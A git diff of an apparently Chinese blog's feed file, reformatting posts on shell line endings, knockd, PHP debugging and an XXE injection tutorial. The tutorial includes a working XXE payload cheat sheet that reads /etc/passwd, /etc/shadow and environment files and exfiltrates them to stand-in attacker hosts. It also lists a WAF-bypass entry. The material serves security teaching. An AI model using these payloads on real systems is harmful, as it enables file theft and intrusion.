     <summary type="html">
@@ -327,7 +333,6 @@
 <p>在Windows中编写的脚本，直接在Linux下运行就可能会出现这样的问题。</p>
 <p>解决办法是：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">'s/\r$//'</span> scriptname.sh</span><br><span class="line">./scriptname.sh</span><br></pre></td></tr></table></figure>
-
 ]]></content>
     
     <summary type="html">
@@ -352,7 +357,6 @@
     <updated>2020-01-16T03:08:22.466Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install knockd</span><br></pre></td></tr></table></figure>
-
 <p>关于Knock的原理与使用请参考鸟哥的教程</p>
 <p><a href="http://linux.vbird.org/linux_security/knockd.php" target="_blank" rel="noopener">使用 knock 管理防火牆</a></p>
 ]]></content>
@@ -377,7 +381,8 @@
     <published>2019-12-16T07:07:04.000Z</published>
     <updated>2019-12-17T01:07:06.955Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="Dumping-variables-to-stdout"><a href="#Dumping-variables-to-stdout" class="headerlink" title="Dumping variables to stdout"></a>Dumping variables to stdout</h3><ul>
+    <content type="html"><![CDATA[<h3 id="dumping-variables-to-stdout"><a class="markdownIt-Anchor" href="#dumping-variables-to-stdout"></a> Dumping variables to stdout</h3>
+<ul>
 <li><strong>var_dump ($var)</strong> dumps the variable type and value to stdout.</li>
 <li><strong>print_r ($var)</strong> prints the variable value in human-readable form to stdout.</li>
 <li><strong>get_defined_vars()</strong> gets all the defined variables including built-ins and custom variables (print_r to view them).</li>
@@ -385,40 +390,55 @@
 <li><strong>debug_print_backtrace()</strong> prints a backtrace that shows the current function call-chain.</li>
 <li><strong>debug_backtrace()</strong> gets the backtrace. You can print_r, log it to a file, or send it to a logging endpoint asynchronously.</li>
 </ul>
-<p>eg:  </p>
+<p>eg:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myVar = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">var_dump($myVar);</span><br><span class="line">print_r($myVar);</span><br><span class="line"></span><br><span class="line">$allVars = get_defined_vars();</span><br><span class="line">print_r($allVars);</span><br><span class="line">debug_zval_dump($allVars);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">($hello)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $hello;</span><br><span class="line">    debug_print_backtrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHello($myVar);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><a href="https://paiza.io/en/projects/new?language=php" target="_blank" rel="noopener">Test PHP online</a></p>
-<h3 id="Switching-error-reporting-level"><a href="#Switching-error-reporting-level" class="headerlink" title="Switching error reporting level"></a>Switching error reporting level</h3><p>PHP has a few ways to configure error reporting. You can use the <code>php.ini</code> file, if you have access to it. Otherwise, you might use the <code>htaccess</code> configuration. If you can’t use configuration files, you have the option of changing the values via a script.</p>
+<h3 id="switching-error-reporting-level"><a class="markdownIt-Anchor" href="#switching-error-reporting-level"></a> Switching error reporting level</h3>
+<p>PHP has a few ways to configure error reporting. You can use the <code>php.ini</code> file, if you have access to it. Otherwise, you might use the <code>htaccess</code> configuration. If you can’t use configuration files, you have the option of changing the values via a script.</p>
 <ul>
 <li><strong>error_reporting</strong> sets the level of logging. <strong>E_NOTICE</strong> is useful during development since it will tell you about defects such as unassigned variables.</li>
 <li><strong>display_errors</strong> tells PHP if and where to display error messages.</li>
 <li><strong>display_startup_errors</strong> should only be used when debugging.</li>
 <li><strong>log_errors</strong> and <strong>error_log</strong> work together to send errors to a log file. Do this in production rather than displaying them to end users.</li>
 </ul>
-<h3 id="PHP-debugging-tools"><a href="#PHP-debugging-tools" class="headerlink" title="PHP debugging tools"></a>PHP debugging tools</h3><p> You can debug PHP using one of many debugging tools to attach a debugger client. <a href="https://www.jetbrains.com/help/phpstorm/php-debugging-session.html" target="_blank" rel="noopener">PhpStorm</a> works with debug utilities like <a href="https://xdebug.org/docs/" target="_blank" rel="noopener">Xdebug</a> and <a href="http://www.zend.com/en/products/studio/downloads" target="_blank" rel="noopener">ZendDebugger</a>. </p>
-<p> Being a polyglot, I need an IDE that supports multiple languages, so I’m opting for <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a> these days. </p>
-<p>1)  <a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">Install XDebug</a> </p>
+<h3 id="php-debugging-tools"><a class="markdownIt-Anchor" href="#php-debugging-tools"></a> PHP debugging tools</h3>
+<p>You can debug PHP using one of many debugging tools to attach a debugger client. <a href="https://www.jetbrains.com/help/phpstorm/php-debugging-session.html" target="_blank" rel="noopener">PhpStorm</a> works with debug utilities like <a href="https://xdebug.org/docs/" target="_blank" rel="noopener">Xdebug</a> and <a href="http://www.zend.com/en/products/studio/downloads" target="_blank" rel="noopener">ZendDebugger</a>.</p>
+<p>Being a polyglot, I need an IDE that supports multiple languages, so I’m opting for <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a> these days.</p>
+<ol>
+<li><a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">Install XDebug</a></li>
+</ol>
 <p>I highly recommend you make a simple <code>test.php</code> file, put a <code>phpinfo();</code> statement in there, then copy the output and paste it into the <a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">XDebug installation wizard</a>. It will analyze it and give you tailored installation instructions for your environment.</p>
-<p>2)  <a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a></p>
-<p> <a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a> by adding <code>zend_extension=path/to/xdebug</code> to your php.ini. The path of your php.ini is shown in your <code>phpinfo()</code> output under “Loaded Configuration File”. </p>
-<p>3)  Enable remote debugging in your <code>php.ini</code>: </p>
+<ol start="2">
+<li><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a></li>
+</ol>
+<p><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a> by adding <code>zend_extension=path/to/xdebug</code> to your php.ini. The path of your php.ini is shown in your <code>phpinfo()</code> output under “Loaded Configuration File”.</p>
+<ol start="3">
+<li>Enable remote debugging in your <code>php.ini</code>:</li>
+</ol>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; allow remote debugging</span><br><span class="line">[XDebug]</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_autostart = 1</span><br></pre></td></tr></table></figure>
-
-<p>4) If you are doing web development, don’t forget to restart your webserver to reload the settings.</p>
-<p>5) Verify your installation by checking your <code>phpinfo()</code> output for an XDebug section.</p>
-<h3 id="VScode-Error"><a href="#VScode-Error" class="headerlink" title="VScode Error"></a>VScode Error</h3><p>1) <strong>setting php.validate.executablePath</strong></p>
-<p> Go to File&gt; Preferences &gt; Settings …  </p>
+<ol start="4">
+<li>
+<p>If you are doing web development, don’t forget to restart your webserver to reload the settings.</p>
+</li>
+<li>
+<p>Verify your installation by checking your <code>phpinfo()</code> output for an XDebug section.</p>
+</li>
+</ol>
+<h3 id="vscode-error"><a class="markdownIt-Anchor" href="#vscode-error"></a> VScode Error</h3>
+<ol>
+<li><strong>setting php.validate.executablePath</strong></li>
+</ol>
+<p>Go to File&gt; Preferences &gt; Settings …</p>
 <p>输入框中输入php，修改 <code>PHP › Validate: Executable Path</code> 下<code>Eidit in settings.json</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;php.validate.executablePath&quot;: &quot;C:\\xampp\\php\\php.exe&quot;,</span><br><span class="line">&quot;php.executablePath&quot;: &quot;C:\\php7.1\\php.exe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>参考：</p>
 <p><a href="https://stackify.com/php-debugging-guide/" target="_blank" rel="noopener">A Detailed Guide to PHP Debugging</a></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;Dumping-variables-to-stdout&quot;&gt;&lt;a href=&quot;#Dumping-variables-to-stdout&quot; class=&quot;headerlink&quot; title=&quot;Dumping variables to stdout&quot;&gt;&lt;/a&gt;Dumpi
+      &lt;h3 id=&quot;dumping-variables-to-stdout&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dumping-variables-to-stdout&quot;&gt;&lt;/a&gt; Dumping variables to stdout&lt;/h3&gt;
+
     
     </summary>
     
@@ -436,50 +456,57 @@
     <published>2019-12-16T03:12:37.000Z</published>
     <updated>2019-12-16T03:15:59.373Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="xxe简介"><a href="#xxe简介" class="headerlink" title="xxe简介"></a>xxe简介</h3><p>XML External Entity Injection，xml外部实体注入漏洞</p>
-<p> 当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h3 id="可能的场景"><a href="#可能的场景" class="headerlink" title="可能的场景"></a>可能的场景</h3><p>很多的网站都会对xml文件进行解析，解析的时候都有可能出现可用的XXE漏洞，从而被攻击利用，攻击的方法基于实体中可以使用的协议。</p>
+    <content type="html"><![CDATA[<h3 id="xxe简介"><a class="markdownIt-Anchor" href="#xxe简介"></a> xxe简介</h3>
+<p>XML External Entity Injection，xml外部实体注入漏洞</p>
+<p>当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h3 id="可能的场景"><a class="markdownIt-Anchor" href="#可能的场景"></a> 可能的场景</h3>
+<p>很多的网站都会对xml文件进行解析，解析的时候都有可能出现可用的XXE漏洞，从而被攻击利用，攻击的方法基于实体中可以使用的协议。</p>
 <p>像XML文件作为配置文件的系统（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为Yiruma处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点。</p>
-<h3 id="XXE的成因分析"><a href="#XXE的成因分析" class="headerlink" title="XXE的成因分析"></a>XXE的成因分析</h3><p>产生原因是XML文档结构和DTD文档类型定义漏洞，参数过滤不严</p>
-<h4 id="xml文档结构"><a href="#xml文档结构" class="headerlink" title="xml文档结构"></a>xml文档结构</h4><p> XML文档有三个部分： </p>
+<h3 id="xxe的成因分析"><a class="markdownIt-Anchor" href="#xxe的成因分析"></a> XXE的成因分析</h3>
+<p>产生原因是XML文档结构和DTD文档类型定义漏洞，参数过滤不严</p>
+<h4 id="xml文档结构"><a class="markdownIt-Anchor" href="#xml文档结构"></a> xml文档结构</h4>
+<p>XML文档有三个部分：</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一部分：XML申明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="comment">&lt;!--第二部分：文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三部分：文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p> 第二部分就是xml文档的DTD部分，也是攻击的产生点。 </p>
-<h3 id="XXE-Payloads"><a href="#XXE-Payloads" class="headerlink" title="XXE Payloads"></a>XXE Payloads</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;sp;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#x25; external SYSTEM "file:///nothere/%payload;"&gt;'&gt; %param1; %external;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml "&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">evil</span>/<span class="attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">stuff</span>;%<span class="attr">end</span>;"&gt;</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [  </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" &gt;</span></span><br><span class="line"><span class="meta">  %one;</span></span><br><span class="line"><span class="meta">  %two;</span></span><br><span class="line"><span class="meta">  %four;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">three</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % two "&lt;!ENTITY % four SYSTEM 'file:///%three;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line"></span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd"&gt;</span></span><br><span class="line"><span class="meta">%asd;</span></span><br><span class="line"><span class="meta">%c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;rrr;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## External dtd ##</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">d</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">proc</span>/<span class="attr">self</span>/<span class="attr">environ</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line"><span class="meta">&lt;!DOCTYPE :. SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: SYTEM "http://"</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM "http://"</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="DTD文档类型定"><a href="#DTD文档类型定" class="headerlink" title="DTD文档类型定"></a>DTD文档类型定</h4><p>1） <strong>DTD内部、外部声明</strong> </p>
+<p>第二部分就是xml文档的DTD部分，也是攻击的产生点。</p>
+<h3 id="xxe-payloads"><a class="markdownIt-Anchor" href="#xxe-payloads"></a> XXE Payloads</h3>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;sp;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#x25; external SYSTEM "file:///nothere/%payload;"&gt;'&gt; %param1; %external;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml "&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;</span><br><span class="line"><span class="tag">&lt;<span 